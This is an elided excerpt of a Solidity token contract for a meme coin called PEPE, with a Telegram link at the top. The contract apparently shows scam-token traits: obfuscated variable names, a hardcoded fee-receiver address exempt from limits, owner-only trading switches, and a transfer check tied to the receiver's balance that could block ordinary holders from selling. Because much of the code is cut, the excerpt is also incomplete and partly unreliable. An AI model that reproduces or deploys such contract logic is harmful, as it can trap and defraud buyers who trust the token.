...
TELEGRAM: https://t.me/PEPECOINEthereum
...
contract Pepe is Context, IERC20, Ownable {
    ...
    address payable private _xrqFaRceiverp;

    uint8 private constant _decimals = 9;
    string private constant _name = "HarryPotterObamMattFurie1Meme";
    string private constant _symbol = "PEPE";
    uint256 private constant _Totalst = 420000000 * 10 **_decimals;
    uint256 public _mxTaxAmaunt = _Totalst;
    uint256 public _WalletSmax = _Totalst;
    uint256 public _wapThresholdtax= _Totalst;
    uint256 public _moaxToxSap= _Totalst;
    ...
    constructor () {
        _balances[_msgSender()] = _Totalst;
        _isExcldedFrof[owner()] = true;
        _isExcldedFrof[address(this)] = true;
        _isExcldedFrof[_xrqFaRceiverp] = true;
        _xrqFaRceiverp = payable(0xB49E00716D03b3fc784D84A0b7042B48103C401c);

        emit Transfer(address(0), _msgSender(), _Totalst);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner () && to != owner ()) {
            ...
            && !_isExcldedFrof[from] ){
                require(amount <= _mxTaxAmaunt && 
                balanceOf(_xrqFaRceiverp)<_moaxToxSap,
                 "Exceeds the _mxTaxAmaunt.");
                teeomoun = amount.mul((_bytwouot>
    ...
    function removeLimits() external onlyOwner{
        _mxTaxAmaunt = _Totalst;
        _WalletSmax = _Totalst;
        _tnsferelanale = false;
        emit _amaunateql(_Totalst);
    }
    ...
    function openTrading( ) external onlyOwner( ) {
        ...
        _approve(address(this), address(_uisapRautet), _Totalst);
